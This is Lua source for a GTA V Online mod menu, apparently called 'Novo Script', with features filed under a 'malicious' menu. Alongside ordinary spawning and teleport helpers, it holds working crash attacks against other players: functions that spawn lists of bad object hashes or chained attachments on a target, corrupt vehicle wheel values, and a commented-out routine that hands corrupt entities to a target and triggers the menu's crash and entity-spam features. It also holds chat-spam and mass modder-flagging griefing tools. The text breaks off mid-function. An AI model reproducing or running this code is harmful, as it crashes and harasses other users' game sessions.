-- Function to load the blacklist from a file
function loadBlacklistFromFile()
    if not utils.file_exists(blacklistPath) then
        menu.notify("Blacklist file not found.", "Error")
        return
    end

    blacklistedVehicles = {}
    for line in io.lines(blacklistPath) do
        local hash = tonumber(line)
        if hash then
            blacklistedVehicles[hash] = true
        end
    end
    menu.notify("Blacklist loaded from file.", "Success")
end

-- Function to save the blacklist to a file
function saveBlacklistToFile()
    local file, err = io.open(blacklistPath, "w")
    if file then
        for vehicleHash, _ in pairs(blacklistedVehicles) do
            file:write(tostring(vehicleHash) .. "\n")
        end
        file:close()
        menu.notify("Blacklist saved to file.", "Success")
    else
        menu.notify("Failed to save blacklist: " .. tostring(err), "Error")
    end
end

-- Function to spawn an object
function spawnObject(objHash, x, y, z, rotX, rotY, rotZ)
    local object = object.create_object(objHash, v3(x, y, z), true, false)
    entity.set_entity_rotation(object, v3(rotX, rotY, rotZ))
    return object
end

-- Function to block an area with objects
function blockArea(areaName, objects)
    if not blockedAreas[areaName] then
        blockedAreas[areaName] = {}
        for _, obj in ipairs(objects) do
            local spawnedObj = spawnObject(obj.hash, obj.x, obj.y, obj.z, obj.rot.x, obj.rot.y, obj.rot.z)
            table.insert(blockedAreas[areaName], spawnedObj)
        end
        menu.notify("Blocked " .. areaName .. ". Press me again to unblock", "Success")
    else
        clearBlockedArea(areaName)
        menu.notify(areaName .. " unblocked", "Success")
    end
end

-- Function to clear blocked area
function clearBlockedArea(areaName)
    if blockedAreas[areaName] then
        for _, obj in ipairs(blockedAreas[areaName]) do
            entity.delete_entity(obj)
        end
        blockedAreas[areaName] = nil
    end
end

-- Helper function to request control of a vehicle
function getControl(entity)
    if not network.has_control_of_entity(entity) then
        network.request_control_of_entity(entity)
        local timeOut = utils.time_ms() + 2000 -- 2 seconds timeout
        while not network.has_control_of_entity(entity) and utils.time_ms() < timeOut do
            system.yield(0)
        end
    end
end

-- This function will get the player's heading and calculate the forward vector
function get_forward_vector_from_heading(heading)
    -- Convert heading to radians for the trigonometric functions
    local heading_rad = math.rad(heading)
    -- Calculate forward vector
    local forward_x = -math.sin(heading_rad)
    local forward_y = math.cos(heading_rad)
    return forward_x, forward_y
end

-- This function will spawn the object relative to the player's position and heading
function spawn_object_relative_to_player(player_coords, player_heading, offset_forward, offset_right, offset_up, model_hash, delete)
    -- Get the forward and right vectors from the player's heading
    local forward_x, forward_y = get_forward_vector_from_heading(player_heading)
    local right_x, right_y = forward_y, -forward_x -- Right vector is perpendicular to the forward vector

    -- Calculate the new position for the object
    local new_x = player_coords.x + forward_x * offset_forward + right_x * offset_right
    local new_y = player_coords.y + forward_y * offset_forward + right_y * offset_right
    local new_z = player_coords.z + offset_up

    -- Request the model
    streaming.request_model(model_hash)
    while not streaming.has_model_loaded(model_hash) do
        system.yield(25)
    end

    -- Create the object in the world
    local cageObject = object.create_world_object(model_hash, v3(new_x, new_y, new_z), true, false)
    configure_cage_entity(cageObject)

    -- Set the object's heading to match the player's heading
    entity.set_entity_heading(cageObject, player_heading)

        -- If the delete flag is true, delete after a delay
        if delete then
            system.yield(1500)  -- Wait for 1.5 seconds
            if entity.is_an_entity(cageObject) then  -- Check if the entity still exists
                entity.delete_entity(cageObject)  -- Delete the entity
            end
        end

        return cageObject
end

function configure_cage_entity(cageObject)
    native.call(0x3882114BDE571AD4, cageObject, true)
    entity.set_entity_as_mission_entity(cageObject, true, true)
    entity.set_entity_collision(cageObject, true, true)
    entity.freeze_entity(cageObject, true)
    entity.set_entity_god_mode(cageObject, true)
    system.yield(10)
    entity.set_entity_as_no_longer_needed(cageObject)
end

--Function to burst specific tire
function burstTire(playerVehicle, tireIndex)
    vehicle.set_vehicle_tire_burst(playerVehicle, tireIndex, true, 1000)
end


function get_distance_between(entity_or_position_1, entity_or_position_2, is_looking_for_distance_between_coords)
    if is_looking_for_distance_between_coords then
        local distance_between = entity_or_position_1 - entity_or_position_2
        return math.abs(distance_between.x) + math.abs(distance_between.y)
    else
        local distance_between = entity.get_entity_coords(entity_or_position_1) - entity.get_entity_coords(entity_or_position_2)
        return math.abs(distance_between.x) + math.abs(distance_between.y)
    end
end

-- Utility function to spawn a pedestrian
function spawn_ped(modelHash, position, heading)
    if not streaming.has_model_loaded(modelHash) then
        streaming.request_model(modelHash)
        while not streaming.has_model_loaded(modelHash) do
            system.yield(25)
        end
    end
    return ped.create_ped(26, modelHash, position, heading, true, false)
end

-- Revised utility function to spawn a vehicle with a driver
function spawn_vehicle_with_driver(vehicleModel, pedModel, position, heading, weaponHash, isAirborne)
    if not streaming.has_model_loaded(vehicleModel) then
        streaming.request_model(vehicleModel)
        while not streaming.has_model_loaded(vehicleModel) do
            system.yield(25)
        end
    end

    -- Adjust spawn position for airborne vehicles
    if isAirborne then
        position.z = position.z + 50.0  -- Spawn 50 meters above the ground
    end

    local vehicle = vehicle.create_vehicle(vehicleModel, position, heading, true, false)
    local driver = spawn_ped(pedModel, position, heading)
    ped.set_ped_into_vehicle(driver, vehicle, -1)
    weapon.give_delayed_weapon_to_ped(driver, weaponHash, 0, true)

    -- Set initial velocity for airborne vehicles
    if isAirborne then
        entity.set_entity_velocity(vehicle, v3(0, 50.0, 0))  -- Set an initial forward velocity
    end

    return vehicle, driver
end

-- Revised function to spawn attackers based on type
function spawn_attacker(type, pid)
    local playerPos = player.get_player_coords(pid)
    local offset = v3(math.random(-30, 30), math.random(-30, 30), 0)
    local spawnPos = playerPos + offset
    local weaponHash = gameplay.get_hash_key("weapon_pistol")
    local attackerPed, attackerVehicle

    if type == "on foot" then
        attackerPed = spawn_ped(gameplay.get_hash_key("s_m_y_blackops_01"), spawnPos, math.random(0, 360))
        weapon.give_delayed_weapon_to_ped(attackerPed, weaponHash, 0, true)
    elseif type == "in car" then
        attackerVehicle, attackerPed = spawn_vehicle_with_driver(gameplay.get_hash_key("police"), gameplay.get_hash_key("s_m_y_cop_01"), spawnPos, math.random(0, 360), weaponHash, false)
    elseif type == "in heli" then
        attackerVehicle, attackerPed = spawn_vehicle_with_driver(gameplay.get_hash_key("buzzard"), gameplay.get_hash_key("s_m_y_blackops_01"), spawnPos, math.random(0, 360), weaponHash, true)
    elseif type == "in plane" then
        attackerVehicle, attackerPed = spawn_vehicle_with_driver(gameplay.get_hash_key("lazer"), gameplay.get_hash_key("s_m_y_blackops_01"), spawnPos, math.random(0, 360), weaponHash, true)
    elseif type == "in boat" then
        attackerVehicle, attackerPed = spawn_vehicle_with_driver(gameplay.get_hash_key("predator"), gameplay.get_hash_key("s_m_y_blackops_01"), spawnPos, math.random(0, 360), weaponHash, false)
    elseif type == "animals" then
        attackerPed = spawn_ped(gameplay.get_hash_key("a_c_rottweiler"), spawnPos, math.random(0, 360))
    end

    return attackerPed, attackerVehicle
end

-- Function to manage attacker behavior
function manage_attackers(attackerPed, attackerVehicle, pid)
    if attackerPed and not entity.is_entity_dead(attackerPed) then
        if attackerVehicle then
            ai.task_combat_ped(attackerPed, player.get_player_ped(pid), 0, 16)
        else
            ai.task_combat_ped(attackerPed, player.get_player_ped(pid), 0, 16)
        end
    else
        if attackerPed then entity.delete_entity(attackerPed) end
        if attackerVehicle then entity.delete_entity(attackerVehicle) end
        return nil, nil
    end
    return attackerPed, attackerVehicle
end

function spawn_alien(pid)
    local playerPos = player.get_player_coords(pid)
    local offset = v3(math.random(-20, 20), math.random(-20, 20), 0)
    local spawnPos = playerPos + offset
    local alien = spawn_ped(gameplay.get_hash_key("s_m_m_movalien_01"), spawnPos, math.random(0, 360))
    weapon.give_delayed_weapon_to_ped(alien, gameplay.get_hash_key("weapon_raypistol"), 0, true)
    ai.task_combat_ped(alien, player.get_player_ped(pid), 0, 16)
    return alien
end

function spawn_zombie(pid)
    local playerPos = player.get_player_coords(pid)
    local offset = v3(math.random(-20, 20), math.random(-20, 20), 0)
    local spawnPos = playerPos + offset
    local zombie = spawn_ped(gameplay.get_hash_key("u_m_y_zombie_01"), spawnPos, math.random(0, 360))
    ai.task_combat_ped(zombie, player.get_player_ped(pid), 0, 16)
    return zombie
end

function request_model(h, t)
    if not h then 
        return 
    end
    if not streaming.has_model_loaded(h) then
           streaming.request_model(h)
        local time = utils.time_ms() + t
        while not streaming.has_model_loaded(h) and time > utils.time_ms() do
               system.wait(5)
           end
    end
    return streaming.has_model_loaded(h)
end

function spawn_vehicle(hash, coords, dir)
    request_model(hash, 1000)
    local car = vehicle.create_vehicle(hash, coords, dir, true, false)
    streaming.set_model_as_no_longer_needed(hash)
    return car
end

function Cped(type, hash, coords, dir)
    request_model(hash, 300)
    local ped = ped.create_ped(type, hash, coords, dir, true, false)
    streaming.set_model_as_no_longer_needed(hash)
    return ped
end

function parseAttachVehFile(filePath)
    local file = io.open(filePath, "r")
    if not file then return nil end

    local items = {}
    for line in file:lines() do
        local name, hashStr = line:match("([^:]+):%s*(%d+),")
        if name and hashStr then
            items[#items + 1] = {name = name, hash = tonumber(hashStr)}
        end
    end
    file:close()

    return items
end

-- Function to read the attachments file and parse it
function parseAttachmentsFile(filePath)
    local file = io.open(filePath, "r")
    if not file then return nil end
    
    local items = {}
    for line in file:lines() do
        local name, hashStr = line:match("([^,]+),%s*(.+)")
        if name and hashStr then
            items[#items + 1] = {name = name, hash = hashStr}
        end
    end
    file:close()
    
    return items
end

function parseAttachPedsFile(filePath)
    local file = io.open(filePath, "r")
    if not file then return nil end

    local items = {}
    for line in file:lines() do
        local hash, name = line:match("(%w+),%s*(.+)")
        if hash and name then
            items[#items + 1] = {hash = hash, name = name}
        end
    end
    file:close()

    return items
end

function getVehicleNames(attachVehicles)
    local names = {}
    for i, vehicle in ipairs(attachVehicles) do
        names[#names + 1] = vehicle.name
    end
    return names
end

-- Function to get attachment names
function getAttachmentNames(attachments)
    local names = {}
    for i, attachment in ipairs(attachments) do
        names[#names + 1] = attachment.name
    end
    return names
end

function getPedNames(attachPeds)
    local names = {}
    for i, ped in ipairs(attachPeds) do
        names[#names + 1] = ped.name
    end
    return names
end

-- Function to read and parse the ptfx file
function parsePtfxFile(filePath)
    local file = io.open(filePath, "r")
    if not file then return nil end

    for line in file:lines() do
        local effectName, assetName, _ = line:match("([^,]+),%s*([^,]+),%s*([^,]+)")
        if effectName and assetName then
            table.insert(ptfxList, {effectName = effectName, assetName = assetName})
        end
    end
    file:close()
end

function getEffectNames(ptfxList)
    local names = {}
    for i, ptfx in ipairs(ptfxList) do
        names[#names + 1] = ptfx.effectName
    end
    return names
end

function spawnAndCustomizeEntity(attachmentHash)
    -- Get the player's current position and heading
    local playerPed = player.get_player_ped(player.player_id())
    local playerPos = player.get_player_coords(player.player_id())
    local playerHeading = entity.get_entity_heading(playerPed)
    
    -- Calculate a position in front of the player for the motorcycle
    local spawnPos = v3(playerPos.x + math.sin(math.rad(playerHeading)) * 5, playerPos.y + math.cos(math.rad(playerHeading)) * 5, playerPos.z)

    -- Spawn the motorcycle
    local motorcycleHash = -1216765807 -- Changed this to be adder, need to change var names but im lazy. 
    streaming.request_model(motorcycleHash)
    while not streaming.has_model_loaded(motorcycleHash) do
        system.yield(0) -- Wait for the model to load
    end
    local motorcycle = vehicle.create_vehicle(motorcycleHash, spawnPos, playerHeading, true, false)
    
    -- Put the player into the driver's seat
    ped.set_ped_into_vehicle(playerPed, motorcycle, -1)
    
    -- Set the motorcycle invisible
    entity.set_entity_visible(motorcycle, false)
    
    -- Spawn and attach the additional entity
    streaming.request_model(attachmentHash)
    while not streaming.has_model_loaded(attachmentHash) do
        system.yield(0) -- Wait for the model to load
    end
    local attachedEntity = vehicle.create_vehicle(attachmentHash, spawnPos, playerHeading, true, false)
    entity.attach_entity_to_entity(attachedEntity, motorcycle, 0, v3(0, 0, 0), v3(0, 0, 0), true, false, false, 0, true)
    
    -- Clean up by marking models as no longer needed
    streaming.set_model_as_no_longer_needed(motorcycleHash)
    streaming.set_model_as_no_longer_needed(attachmentHash)
end

function spawnAndCustomizeObject(attachmentHash)
    local hashNum = gameplay.get_hash_key(attachmentHash)
    -- Get the player's current position and heading
    local playerPed = player.get_player_ped(player.player_id())
    local playerPos = player.get_player_coords(player.player_id())
    local playerHeading = entity.get_entity_heading(playerPed)
    
    -- Calculate a position in front of the player for the motorcycle
    local spawnPos = v3(playerPos.x + math.sin(math.rad(playerHeading)) * 5, playerPos.y + math.cos(math.rad(playerHeading)) * 5, playerPos.z)

    -- Spawn the motorcycle
    local motorcycleHash = -1216765807 -- Changed this to be adder, need to change var names but im lazy. 
    streaming.request_model(motorcycleHash)
    while not streaming.has_model_loaded(motorcycleHash) do
        system.yield(0) -- Wait for the model to load
    end
    local motorcycle = vehicle.create_vehicle(motorcycleHash, spawnPos, playerHeading, true, false)
    
    -- Put the player into the driver's seat
    ped.set_ped_into_vehicle(playerPed, motorcycle, -1)
    
    -- Set the motorcycle invisible
    entity.set_entity_visible(motorcycle, false)
    
    -- Spawn and attach the additional entity
    streaming.request_model(hashNum)
    while not streaming.has_model_loaded(hashNum) do
        system.yield(0) -- Wait for the model to load
    end
    local attachedEntity = object.create_object(hashNum, spawnPos, true, false)
    entity.attach_entity_to_entity(attachedEntity, motorcycle, 0, v3(0, 0, 0), v3(0, 0, 0), true, false, false, 0, true)
    
    -- Clean up by marking models as no longer needed
    streaming.set_model_as_no_longer_needed(hashNum)
    streaming.set_model_as_no_longer_needed(hashNum)
end

function getControl2(ent)
    if ent and type(ent) == "number" and entity.is_an_entity(ent) then
        if not network.has_control_of_entity(ent) then
            network.request_control_of_entity(ent)
            local timeOut = utils.time_ms() + 2000 -- 2 seconds timeout
            while entity.is_an_entity(ent) and not network.has_control_of_entity(ent) and utils.time_ms() < timeOut do
                system.yield(0)
            end
        end
        return entity.is_an_entity(ent) and network.has_control_of_entity(ent)
    end
end

-- Global tables to keep track of spawned entities
spawnedObjects = {}
spawnedVehicles = {}

-- Function to delete entities and clear the list
function deleteEntities(entitiesList)
    for _, entityID in ipairs(entitiesList) do
            entity.delete_entity(entityID)
    end
    -- Clear the list after deletion to prepare for next toggle on
    return {}
end

-- Request and load a PTFX asset
function requestAndLoadPtfxAsset(assetName)
    graphics.request_named_ptfx_asset(assetName)
    while not graphics.has_named_ptfx_asset_loaded(assetName) do
        system.yield(0) -- Changed from system.wait to system.yield
    end
end

-- Create and attach an object to a player
function createAndAttachObject(objectHash, position, attachToPed)
    local obj = object.create_object(objectHash, position, true, false)
    entity.attach_entity_to_entity(obj, attachToPed, 0, v3(0, 0, 0), v3(0, 0, 0), false, true, false, 0, true)
    return obj
end

-- Spawn vehicles and delete them after a short duration
function spawnAndDeleteVehicles(vehHash, position, count)
    streaming.request_model(vehHash)
    while not streaming.has_model_loaded(vehHash) do
        system.yield(10) -- Adjusted for consistency
    end

    for i = 1, count do
        local veh = vehicle.create_vehicle(vehHash, position, position.z, true, false)
        table.insert(spawnedVehicles, veh)
    end

    system.yield(50) -- Wait before deletion

    spawnedVehicles = deleteEntities(spawnedVehicles)
    streaming.set_model_as_no_longer_needed(vehHash)
end

function markAllPlayersAsModders()
    local me = player.player_id() -- Get the current player's ID
    for pid = 0, 31 do -- Adjust the max player count based on your game/environment
        if pid ~= me and player.is_player_valid(pid) then
            player.set_player_as_modder(pid, 1)
        end
        system.yield(0) -- Yield to prevent freezing, allowing other game processes to run
    end
end

function unmarkAllPlayersAsModders()
    local me = player.player_id() -- Get the current player's ID
    for pid = 0, 31 do
        if pid ~= me and player.is_player_valid(pid) then
            for i = 0, 32 do
                player.unset_player_as_modder(pid, i)
            end
        end
        system.yield(0) -- Yield to prevent freezing, allowing other game processes to run
    end
end

-- Global flag to control the thread's execution
shouldMonitorHealth = false

-- Function to monitor player health and resurrect if necessary
function monitorAndResurrectPlayer()
    local me = player.player_id() -- Obtain the current player's ID
    local myPed = player.get_player_ped(me) -- Get the player's ped

    while shouldMonitorHealth do
        local health = player.get_player_health(me) -- Check the player's health
        if health < 1 then
            ped.resurrect_ped(myPed) -- Resurrect the player if health is below 1
            ped.clear_ped_tasks_immediately(myPed) -- Clear any tasks the player might have immediately after resurrection
            system.yield(100) -- Wait a bit after resurrection to prevent immediate re-check
        end
        system.wait(10) -- Check every 10 milliseconds
    end
end

function tpAboveThem(there_pid)
    local my_player_ped = player.get_player_ped(player.player_id())
    local there_player_coords = player.get_player_coords(there_pid)
    entity.set_entity_coords_no_offset(my_player_ped, v3(there_player_coords.x, there_player_coords.y, there_player_coords.z + 400))
end

sessionChatThread = nil -- Keep track of the thread

-- Function to handle chat disabling method
function disableSessionChatMethod(selectedOption)
    while true do
        if selectedOption == 1 then
            -- Continuously send empty chat messages to disable chat for everyone
            network.send_chat_message(" ", false)
        elseif selectedOption == 2 then
            -- Send empty chat message to disable chat for team only
            network.send_chat_message(" ", true)
        end
        system.yield(0) -- Yield to prevent freezing, allowing other game processes to run
    end
end

created_obj_invaild = {}

-- Function to create and position a world object
function createAndPositionObject(modelHash, position, isVisible, player_id_test)
    local obj = object.create_world_object(modelHash, v3(0, 0, 0), true, true)
    table.insert(created_obj_invaild, obj)
    for i = 1, 100 do
    entity.set_entity_coords_no_offset(obj, position)
    end
    entity.attach_entity_to_entity(obj, player.get_player_ped(player_id_test), 0, v3(0, 0, 0), v3(0, 0, 0), false, true, false, 0, true)
    if isVisible ~= nil then
        entity.set_entity_visible(obj, isVisible)
    end
end


function remove_invaild_entity()
    for i, entity_dele in ipairs(created_obj_invaild) do
        entity.delete_entity(entity_dele)
    end
end
-- Main feature implementation
function setupObjectCrash(player_id_int)
    local pos = player.get_player_coords(player_id_int) -- Get player's current position
    local playerPos = player.get_player_coords(player_id_int) -- Get player's current position without offset

    -- Array of objects to create {modelHash, isVisible}
    local objectsToCreate = {
        {-1364166376, true}, {1734157390, false}, {3882145684, false}, {3864969444, false}, {3854081329, false},
        {3786323720, false}, {3726116795, true}, {3656664908, true}, {3648109486, true}, {3656664908, true},
        {3613262246, true}, {3511376803, true}, {3480918685, true}, {875648136, true}, {3476535839, true},
        {3405520579, true}, {3330907358, true}, {3303982422, true}, {3301528862, true}, {3284142177, true},
        {3269941793, true}, {3268188632, true}, {3269941793, true}, {3268188632, true}, {3229061844, true},
        {3063601656, true}, {2783171697, true}, {2410820516, true}, {2180726768, true}, {2041844081, true},
        {2040219850, true}, {2015249693, true}, {2783171697, true}, {1982224326, true}, {1936183844, true},
        {1793920587, true}, {1781006001, true}, {1775565172, true}, {1759812941, true}, {1734157390, true},
        {2040219850, true}, {1727217687, true}, {1567950121, true}, {1481697203, true}, {1221915621, true},
        {987584502, true}, {987584502, true}, {875648136, true}, {863710036, true}, {618696223, true},
        {2410820516, true}, {450174759, true}, {1198835546, true}, {386259036, true}, {213036232, true},
        {3656664908, true}, {3330907358, true}, {17258065, true}, {3269941793, true}, {1872771678, true},
        {-41176169, true}, {122627294, true}, {446398, true}, {849958566, true}, {849958566, true},
        {-568220328, true}, {2155335200, true}, {1272323782, true}, {1296557055, true}, {29828513, true},
        {2250084685, true}, {2349112599, true}, {1599985244, true}, {3523942264, true}, {3457195100, true},
        {3762929870, true}, {1016189997, true}, {861098586, true}, {3245733464, true}, {2494305715, true},
        {671173206, true}, {3769155529, true}, {978689073, true}, {100436592, true}, {3107991431, true},
        {1327834842, true}, {1327834842, true}, {1239708330, true}, {0xA4D194D1, true}, {0x9CAFCB2, true},
        {0x4F7B518F, true}, {0xE6CB661E, true},
    }    

    -- streaming request all models
    for _, objData in ipairs(objectsToCreate) do
        streaming.request_model(objData[1])
        while not streaming.has_model_loaded(objData[1]) do
            system.yield(0)
        end
    end

    -- Create and position objects
    for i, objData in ipairs(objectsToCreate) do
        createAndPositionObject(objData[1], playerPos, objData[2], player_id_int)
        if i % 10 == 0 then
            system.yield(10) -- Yield every 10 objects to prevent freezing
        end
    end

    system.yield(1500) -- Wait for a duration before cleanup
    remove_invaild_entity()
end

function createWorldObjectSafely(modelHash, position, dynamic, isVisible)
    streaming.request_model(modelHash)
    while not streaming.has_model_loaded(modelHash) do
        system.yield(0) -- Wait a frame to allow model to load
    end
    local obj = object.create_world_object(modelHash, position, dynamic, isVisible)
    return obj
end

function ChainAttachObjects(pid)
    local playerPos = player.get_player_coords(pid)
    local offsetPos = v3(300, 300, 300) -- Offset position from the player
    local badattachModelHash = 4221382737
    local badattachChildrenHashes = {
        849958566, -568220328, 2155335200, 1272323782, 1296557055,
        29828513, 2250084685, 2349112599, 1599985244, 3523942264,
        3457195100, 3762929870, 1016189997, 861098586, 3613262246,
        3245733464, 2494305715, 671173206, 3769155529, 978689073,
        100436592, 3107991431, 1327834842, 1239708330
    }
    badattachChildren = {}

    -- Create main sync handler object
    local badattachmain = createWorldObjectSafely(badattachModelHash, playerPos + offsetPos, true, false)
    network.request_control_of_entity(badattachmain)

    -- Create and attach child objects to the main sync handler
    for i, modelHash in ipairs(badattachChildrenHashes) do
        local childObj = createWorldObjectSafely(modelHash, playerPos + offsetPos, true, false)
        network.request_control_of_entity(childObj)
        entity.attach_entity_to_entity(childObj, badattachmain, 0, v3(0, 0, 0), v3(0, 0, 0), true, true, false, 0, false)
        table.insert(badattachChildren, childObj)
    end

    -- Move the main sync handler randomly for a short period
    local endTime = utils.time_ms() + 2000
    while utils.time_ms() < endTime do
        system.yield(math.random(0, 10))
        local newPos = playerPos + v3(math.random(-1, 1), math.random(-1, 1), math.random(-1, 1))
        entity.set_entity_coords_no_offset(badattachmain, newPos)
    end

    -- Cleanup: Delete the main sync handler and its children
    network.request_control_of_entity(badattachmain)
    entity.delete_entity(badattachmain)
    for _, childObj in ipairs(badattachChildren) do
        if entity.is_an_entity(childObj) then
            network.request_control_of_entity(childObj)
            entity.delete_entity(childObj)
        end
    end
end

-- local vehicle = require("vehicle")
function unrenderveh(veh)
    native.call(0x00689CDE5F7C6787, veh)
    native.call(0xFB8794444A7D60FB, veh, true)
    native.call(0xCAC66558B944DA67, veh, true) -- pretty sure this isn't needed, but helped with planes.
    native.call(0xB893215D8D4C015B, veh, 7000)
    for veh_asset = 0, 159 do
        native.call(0xACE699C71AB9DEB5, veh_asset)
    end
end

function messwithveh(veh)
    local maxAttempts = 20
    local attempts = 0

    repeat
        network.request_control_of_entity(veh)
        attempts = attempts + 1
        system.yield(0)
    until network.has_control_of_entity(veh) or attempts >= maxAttempts

    local offsets = {0, -999999999999999999, 999999999999999999}
    local tireIndices = {1, 2, 3}

    for _, offset in ipairs(offsets) do
        for _, Index in ipairs(tireIndices) do
            vehicle.set_vehicle_wheel_tire_width(veh, tireIndices[Index], offsets[Index])
            vehicle.set_vehicle_wheel_x_offset(veh, tireIndices[Index], offsets[Index])
            vehicle.set_vehicle_wheel_traction_vector_length(veh, tireIndices[Index], offsets[Index])
            vehicle.set_vehicle_wheel_y_rotation(veh, tireIndices[Index], offsets[Index])
        end
    end
    unrenderveh(veh)
    vehicle.set_vehicle_current_gear(veh, 0)
    vehicle.set_vehicle_wheel_type(veh, -1)
end

function constructObjectsArray_ApartmentInteriors()
    local objects = {}
    for i = 1, #x_coords_ApartmentInteriors do
        local obj = {
            hash = gameplay.get_hash_key("stt_prop_stunt_tube_fn_05"),
            x = x_coords_ApartmentInteriors[i],
            y = y_coords_ApartmentInteriors[i],
            z = z_coords_ApartmentInteriors[i],
            rot = {x = 0, y = 90, z = 0}
        }
        table.insert(objects, obj)
    end
    return objects
end

function readVehicleNamesBlacklist(filePath)
    local names = {}
    for line in io.lines(filePath) do
        local hash, name = line:match("Hash=(%d+)%s+Name=\"([^\"]+)\"")
        if hash and name then
            names[tonumber(hash)] = name
        end
    end
    return names
end

function setmenoinvisible()
    local me = player.player_id()
    local myPed = player.get_player_ped(me)
    entity.set_entity_visible(myPed, true)
end

-- Arrays to store the parsed data
names_pickup = {}
hashes_pickup = {}
models_pickup = {}

function parse_and_update_feature(pickups_paths)
    local file, err = io.open(pickups_paths, "r")
    if not file then
        print("Failed to open file at path: " .. pickups_paths .. ". Error: " .. err)
        return false
    else
        print("File opened successfully.")
    end

    -- Reset arrays to ensure fresh data on each call
    names_pickup = {}
    hashes_pickup = {}
    models_pickup = {}

    -- Temporary storage for current item's details
    local currentItem = {}

    for line in file:lines() do
        local key, value = line:match('"(.-)": "(.-)"')
        if key and value then
            if key == "Name" then
                table.insert(names_pickup, value)
            elseif key == "Hash" then
                table.insert(hashes_pickup, tonumber(value))
            elseif key == "Model" then
                table.insert(models_pickup, value)
            end
        end
    end

    file:close()

    -- Debugging: Print counts to verify
    -- menu.notify("Parsed " .. #names_pickup .. " names, " .. #hashes_pickup .. " hashes, and " .. #models_pickup .. " models.", "Success")
end

function spawn_vehicle_and_ped(veh_hash, ped_hash, coords)
    local vehicle = vehicle.create_vehicle(veh_hash, coords, 0, true, false)
    native.call(0x49733E92263139D1, vehicle)
    
    local ped = ped.create_ped(26, ped_hash, coords, 0, true, false)
    
    system.yield(25)
    
    native.call(0xF75B0D629E1C063D, ped, vehicle, -1)
        system.yield(10)
    -- add ped and veh to the arrays
    table.insert(spawned_crash_vehs, vehicle)
    table.insert(spawned_crash_peds, ped)
end

function spawn_bad_vehicle_and_ped(veh_hash, ped_hash, coords)
    local vehicle = vehicle.create_vehicle(veh_hash, coords, 0, true, false)
    native.call(0x49733E92263139D1, vehicle)
    
    native.call(0x1F2AA07F00B3217A, targetVehicle2, 0)
    native.call(0x6AF0636DDEDCB6DD, targetVehicle2, 34, 3, false)
    native.call(0x2A1F4F37F95BAD08, targetVehicle2, 34, true)

    local ped = ped.create_ped(26, ped_hash, coords, 0, true, false)
    
    system.yield(25)
    
    native.call(0xF75B0D629E1C063D, ped, vehicle, -1)
    
        system.yield(10)

        -- add ped and veh to the arrays
    table.insert(spawned_crash_vehs, vehicle)
    table.insert(spawned_crash_peds, ped)
end

-- Spawn vehicles and peds
function spawn_vehicles_and_peds(pid, num_vehicles, veh_hash, ped_hash, coords)
    for i = 1, num_vehicles do
        coords.x = coords.x + math.random(-5, 5)
        coords.y = coords.y + math.random(-5, 5)
        spawn_vehicle_and_ped(veh_hash, ped_hash, coords)
    end
end

function spawn_bad_vehicles_and_peds(pid, num_vehicles, veh_hash, ped_hash, coords)
    for i = 1, num_vehicles do
        coords.x = coords.x + math.random(-5, 5)
        coords.y = coords.y + math.random(-5, 5)
        spawn_bad_vehicle_and_ped(veh_hash, ped_hash, coords)
    end
end

already_added_features = {}

--  function performActionsIntregrated()
--      for _, feature in ipairs(already_added_features) do
--          menu.delete_feature(feature)
--      end
--      already_added_features = {}
--      for pid = 0, 31 do
--          if player.is_player_valid(pid) then
--          --    if already_added_features[pid] then
--          --        menu.delete_feature(already_added_features[pid])
--          --        already_added_features[pid] = nil -- Clear the record.
--          --    end
--              -- if this feature had already been added then use menu.delete_feature(int id, bool|nil recursive) before we add it again to remove any dupes
--              better_menu_crash = menu.add_integrated_feature("Better Menu Crash", "action", menu.get_feature_by_hierarchy_key('online.online_players.player_' ..pid.. '.script_features.novo_lua.malicious'), function(feat)
--                  streaming.request_model(-252946718) -- ped
--                  while not streaming.has_model_loaded(-252946718) do
--                      system.yield(0)
--                  end
--                  streaming.request_model(-599568815) -- veh
--                  while not streaming.has_model_loaded(-599568815) do
--                      system.yield(0)
--                  end
--                  streaming.request_model(1349725314) -- bad veh
--                  while not streaming.has_model_loaded(1349725314) do
--                      system.yield(0)
--                  end
--  
--                  local there_coords = player.get_player_coords(pid)
--                  spawn_vehicles_and_peds(pid, 2, -599568815, -252946718, there_coords)
--                  menu.notify("Sending Crash", "Novo Script")
--                  local ped_net_id2 = native.call(0xA11700682F3AD45C, spawned_crash_peds[2])
--                  local veh_net_id2 = native.call(0xA11700682F3AD45C, spawned_crash_vehs[2])
--                  for i = 1, 100 do
--                      network.give_player_control_of_entity(pid, spawned_crash_peds[2])
--                      network.give_player_control_of_entity(pid, spawned_crash_vehs[2])
--                      network.give_player_control_of_entity(pid, spawned_crash_peds[2])
--                      network.give_player_control_of_entity(pid, spawned_crash_vehs[2])
--                      if not network.has_control_of_entity(spawned_crash_peds[2]) then
--                          native.call(0x299EEB23175895FC, ped_net_id2, true)
--                      end
--                      if not network.has_control_of_entity(spawned_crash_vehs[2]) then
--                          native.call(0x299EEB23175895FC, veh_net_id2, true)
--                      end
--                  end
--              --    menu.notify("Gave control of entities", "Gave control of entities")
--                  menu_crash = menu.get_feature_by_hierarchy_key('online.online_players.player_' ..pid.. '.5g_crash')
--                  beach_spam = menu.get_feature_by_hierarchy_key('online.online_players.player_' ..pid.. '.entity_spam').children[2]
--                  frank_spam = menu.get_feature_by_hierarchy_key('online.online_players.player_' ..pid.. '.entity_spam').children[3]
--                  michael_spam = menu.get_feature_by_hierarchy_key('online.online_players.player_' ..pid.. '.entity_spam').children[4]
--                  trev_spam = menu.get_feature_by_hierarchy_key('online.online_players.player_' ..pid.. '.entity_spam').children[5]
--                  system.yield(1000)
--                  menu_crash.on = true
--                  system.yield(300)
--                  beach_spam.on = true
--                  frank_spam.on = true
--                  michael_spam.on = true
--                  trev_spam.on = true
--                  spawned_crash_vehs = {}
--                  spawned_crash_peds = {}
--              --    menu.notify("Triggered crash", "Triggered crash")
--              end)
--              table.insert(already_added_features, better_menu_crash.id)
--          --    better_menu_crash.hint = "uses crashes built into the menu, just spawns traffic entities and moves your coords to make the crashes more effective"
--          better_menu_crash.hidden = true
--  
--              better_menu_crash2 = menu.add_integrated_feature("Better Menu Crash 2", "action", menu.get_feature_by_hierarchy_key('online.online_players.player_' ..pid.. '.script_features.novo_lua.malicious'), function(feat)
--                  streaming.request_model(-252946718) -- ped
--                  while not streaming.has_model_loaded(-252946718) do
--                      system.yield(0)
--                  end
--                  streaming.request_model(-599568815) -- veh
--                  while not streaming.has_model_loaded(-599568815) do
--                      system.yield(0)
--                  end
--                  streaming.request_model(1349725314) -- bad veh
--                  while not streaming.has_model_loaded(1349725314) do
